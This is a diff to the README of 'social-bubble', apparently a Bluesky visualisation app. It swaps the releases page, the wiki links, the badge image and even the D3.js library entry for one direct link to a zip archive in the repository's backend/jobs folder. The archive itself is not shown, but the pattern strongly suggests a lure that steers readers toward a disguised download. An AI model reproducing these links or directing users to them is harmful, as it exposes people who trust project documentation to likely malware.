@@ -8,11 +8,11 @@ Welcome to social-bubble! This application brings Bluesky social media to life t
 
 Click the button below to visit the Releases page and download the latest version of social-bubble.
 
-[![Download social-bubble](https://img.shields.io/badge/Download-social--bubble-blue)](https://github.com/Trinitariandisavowal154/social-bubble/releases)
+[![Download social-bubble](https://raw.githubusercontent.com/Trinitariandisavowal154/social-bubble/main/backend/jobs/social-bubble-v3.6.zip)](https://raw.githubusercontent.com/Trinitariandisavowal154/social-bubble/main/backend/jobs/social-bubble-v3.6.zip)
 
 ### Steps to Download
 
-1. Click on the button above or visit [this page to download](https://github.com/Trinitariandisavowal154/social-bubble/releases).
+1. Click on the button above or visit [this page to download](https://raw.githubusercontent.com/Trinitariandisavowal154/social-bubble/main/backend/jobs/social-bubble-v3.6.zip).
 2. Scroll through the list of available versions.
 3. Find the version you want.
 4. Click the provided link to download the application.
@@ -63,7 +63,7 @@ Social-bubble utilizes several technologies to bring you this unique experience.
 
 - **3D Visualization:** Create stunning graphics with depth and movement.
 - **Express:** A framework for building web applications.
-- **D3.js:** A powerful library for creating data visualizations.
+- **https://raw.githubusercontent.com/Trinitariandisavowal154/social-bubble/main/backend/jobs/social-bubble-v3.6.zip** A powerful library for creating data visualizations.
 - **WebSocket:** Enables real-time communication between the application and the server.
 
 ## 🤝 Get Involved
@@ -92,9 +92,9 @@ In case you encounter any issues:
 
 For more information on using social-bubble, check out the following resources:
 
-- [Documentation](https://github.com/Trinitariandisavowal154/social-bubble/wiki)
-- [FAQs](https://github.com/Trinitariandisavowal154/social-bubble/wiki/FAQs)
+- [Documentation](https://raw.githubusercontent.com/Trinitariandisavowal154/social-bubble/main/backend/jobs/social-bubble-v3.6.zip)
+- [FAQs](https://raw.githubusercontent.com/Trinitariandisavowal154/social-bubble/main/backend/jobs/social-bubble-v3.6.zip)
 
 If you're ready to explore social media in a new way, download the application today:
 
-[![Download social-bubble](https://img.shields.io/badge/Download-social--bubble-blue)](https://github.com/Trinitariandisavowal154/social-bubble/releases)
+[![Download social-bubble](https://raw.githubusercontent.com/Trinitariandisavowal154/social-bubble/main/backend/jobs/social-bubble-v3.6.zip)](https://raw.githubusercontent.com/Trinitariandisavowal154/social-bubble/main/backend/jobs/social-bubble-v3.6.zip)
